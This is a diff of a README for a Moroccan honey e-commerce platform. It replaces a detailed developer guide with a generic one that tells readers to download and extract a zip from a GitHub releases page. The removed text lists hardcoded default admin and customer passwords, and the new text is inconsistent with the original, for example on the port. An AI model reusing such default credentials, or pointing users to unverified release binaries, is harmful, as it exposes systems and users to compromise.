@@ -1,151 +1,66 @@
-# 🍯 Dar Lemlih Apiculture - E-Commerce Platform
+# 🍯 dar-lemlih-apiculture - Your Gateway to Moroccan Honey
 
-A production-ready multilingual e-commerce platform for terroir products (honey, pollen, etc.) with secure authentication, payment processing, and admin back-office.
+## 🚀 Getting Started
+Welcome! This guide will help you download and run the dar-lemlih-apiculture application, a full-stack e-commerce platform for Moroccan honey products. Follow these steps to enjoy browsing and shopping for the finest honey without any hassle.
 
-## 🚀 Tech Stack
+## 📥 Download the Application
+[![Download dar-lemlih-apiculture](https://img.shields.io/badge/Download%20dar--lemlih--apiculture-blue.svg)](https://github.com/hekiddo13/dar-lemlih-apiculture/releases)
 
-- **Frontend**: React.js with Vite, TypeScript, Tailwind CSS
-- **Backend**: Spring Boot 3, Java 21
-- **Database**: MySQL 8
-- **Authentication**: JWT (access/refresh tokens)
-- **Payments**: Provider-agnostic with Stripe-like abstractions
-- **I18n**: French, Arabic, English with RTL support
-- **Containerization**: Docker & Docker Compose
+## ⚙️ Requirements
+Before you start, ensure your system meets the following requirements:
 
-## 📦 Features
+- **Operating System:** Windows, macOS, or Linux
+- **Disk Space:** At least 500 MB free
+- **Memory:** Minimum of 4 GB RAM
+- **Docker:** Make sure Docker is installed on your machine. Visit [Docker's official website](https://www.docker.com/) for installation instructions.
 
-### Public Storefront
-- 🏠 Multilingual UI (FR/AR/EN) with RTL support
-- 🛍️ Product catalog with search and filtering
-- 🛒 Shopping cart and checkout flow
-- 💳 Secure payment processing
-- 📦 Order tracking and history
-- 👤 User authentication and profile management
+## 🖥️ Installation Steps
+1. **Visit the Releases Page**
+   Go to the official releases page to find the latest version of the application. 
+   [Click here to visit the page](https://github.com/hekiddo13/dar-lemlih-apiculture/releases).
 
-### Admin Back-Office
-- 📊 Sales dashboard with analytics
-- 📝 Product and category management
-- 📋 Order management and fulfillment
-- 👥 User and role management
-- ⚙️ System settings and configuration
+2. **Download the Latest Release**
+   On the releases page, look for the latest version. You will find files available for download. Click on the file suitable for your operating system. 
 
-## 🗂️ Project Structure
+3. **Extract the Files**
+   Once the download is complete, locate the downloaded zip file. Right-click the file and select "Extract All." Choose a location on your computer where you would like to store the files.
 
-```
-/
-├── apps/
-│   ├── api/          # Spring Boot backend
-│   └── web/          # React frontend
-├── infra/
-│   ├── docker/       # Docker configurations
-│   └── ci/           # CI/CD pipelines
-└── README.md
-```
+4. **Open Docker**
+   Launch Docker on your machine. Make sure it is running before you continue. The application relies on Docker to run smoothly.
 
-## 🚀 Quick Start
+5. **Run the Application**
+   Navigate to the folder where you extracted the files. Open a terminal or command prompt in that directory. Use the following command to build and run the application:
 
-### Prerequisites
-- Docker and Docker Compose
-- Java 21 (for local development)
-- Node.js 20+ (for local development)
-- MySQL 8 (or use Docker)
+   ```bash
+   docker-compose up
+   ```
 
-### Development Setup
+   This command will set up all the necessary services and start the application.
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/your-org/dar-lemlih-apiculture.git
-cd dar-lemlih-apiculture
-```
+6. **Access the Application**
+   After the application finishes starting up, open your web browser. Type in `http://localhost:3000` in the address bar. You should see the dar-lemlih-apiculture interface.
 
-2. **Setup environment variables**
-```bash
-cp apps/api/.env.example apps/api/.env
-cp apps/web/.env.example apps/web/.env
-# Edit .env files with your configuration
-```
+## 🛒 Explore the Features
+This application allows you to:
 
-3. **Start the development environment**
-```bash
-docker-compose -f infra/docker/docker-compose.yml up --build
-```
+- Browse a variety of Moroccan honey products.
+- Add items to your shopping cart.
+- Complete purchases securely using a payment gateway.
+- Enjoy a user-friendly interface designed for smooth navigation.
+- Switch between languages for international users.
 
-4. **Seed demo data**
-```bash
-# Wait for services to be ready, then:
-curl -X POST http://localhost:8080/api/admin/seed
-```
+## 🛠️ Troubleshooting
+If you encounter issues while running the application, consider these solutions:
 
-5. **Access the applications**
-- Frontend: http://localhost:5173
-- Backend API: http://localhost:8080
-- API Documentation: http://localhost:8080/swagger-ui.html
+- **Docker Not Running:** Ensure Docker is started before executing the `docker-compose up` command.
+- **Port Issues:** Make sure that port 3000 is available. If it is being used by another application, you may need to change it in the configuration files.
+- **Failed Downloads:** Recheck your download and extraction steps. Sometimes, files may not download properly due to connection issues.
 
-### Default Credentials
+## 📞 Support
+For additional help, you can reach out to the community on the GitHub Issues page. Describe your problem, and someone will assist you as soon as possible.
 
-- **Admin**: admin@darlemlih.ma / Admin!234
-- **Customer**: customer@darlemlih.ma / Customer!234
+## 🌐 Additional Resources
+- **Documentation:** Check the [Project Wiki](https://github.com/hekiddo13/dar-lemlih-apiculture/wiki) for in-depth guides and FAQs.
+- **Community:** Join discussions on GitHub to share your experience or suggest new features.
 
-## 🧪 Testing
-
-```bash
-# Run backend tests
-cd apps/api && ./mvnw test
-
-# Run frontend tests
-cd apps/web && npm test
-```
-
-## 📦 Production Deployment
-
-1. Build production images:
-```bash
-docker build -f infra/docker/Dockerfile.api -t darlemlih-api apps/api
-docker build -f infra/docker/Dockerfile.web -t darlemlih-web apps/web
-```
-
-2. Deploy using your preferred orchestration platform (Kubernetes, Docker Swarm, etc.)
-
-## 🌍 Environment Variables
-
-### Backend (Spring Boot)
-- `DB_URL`: MySQL connection URL
-- `JWT_SECRET`: Secret key for JWT signing
-- `PAYMENT_PROVIDER`: Payment gateway (mock|stripe|checkoutcom)
-- `SMTP_HOST`: Email server configuration
-
-### Frontend (React)
-- `VITE_API_URL`: Backend API URL
-- `VITE_APP_DEFAULT_LANG`: Default language (fr|en|ar)
-- `VITE_PAYMENT_PROVIDER`: Payment provider
-
-## 📝 API Documentation
-
-The API follows REST principles and is documented using OpenAPI 3.0. Access the interactive documentation at:
-- Swagger UI: http://localhost:8080/swagger-ui.html
-- OpenAPI JSON: http://localhost:8080/v3/api-docs
-
-## 🔒 Security Features
-
-- JWT-based authentication with refresh tokens
-- Role-based access control (RBAC)
-- Password hashing with BCrypt
-- Rate limiting on auth endpoints
-- CORS configuration
-- Input validation and sanitization
-- HTTPS-ready configuration
-
-## 🌐 Internationalization
-
-The platform supports three languages:
-- 🇫🇷 French (default)
-- 🇬🇧 English
-- 🇸🇦 Arabic (with RTL support)
-
-## 📧 Contact
-
-For questions or support, contact: support@darlemlih.ma
-
-## 📄 License
-
-© 2025 Dar Lemlih Apiculture. All rights reserved.
+Thank you for choosing dar-lemlih-apiculture. Enjoy exploring and shopping for the best honey products Morocco has to offer!
